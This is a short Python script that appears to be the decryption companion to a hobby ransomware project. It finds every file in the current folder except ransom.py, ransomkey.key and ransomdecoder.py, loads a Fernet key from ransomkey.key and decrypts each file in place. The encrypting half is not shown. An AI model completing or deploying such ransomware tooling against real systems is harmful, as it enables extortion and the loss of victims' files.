import os
from cryptography.fernet import Fernet

file_list = []

def getting_files():  #get files except our ransomware and folders
    global file_list
    for file in os.listdir():
        if file == "ransom.py" or file == "ransomkey.key" or file == "ransomdecoder.py":
            continue
        elif os.path.isfile(file):
            file_list.append(file)
            print(str(file) + " added to list")



def decoding_files(file_list, key):  # decode files with the pre generated Fernet key
    for file in file_list:
        with open(file, "rb") as decoding_file:
            content = decoding_file.read()
        decrypted_content = Fernet(key).decrypt(content)
        with open(file, "wb") as decoding_file:
            decoding_file.write(decrypted_content)

def getting_key():  # get key to decode files
    with open("ransomkey.key", "rb") as get_key:
        key = get_key.read()
    return key


def __main__(): 
    global file_list
    getting_files()
    print(file_list)
    key = getting_key()
    print(key)
    decoding_files(file_list, key)

__main__()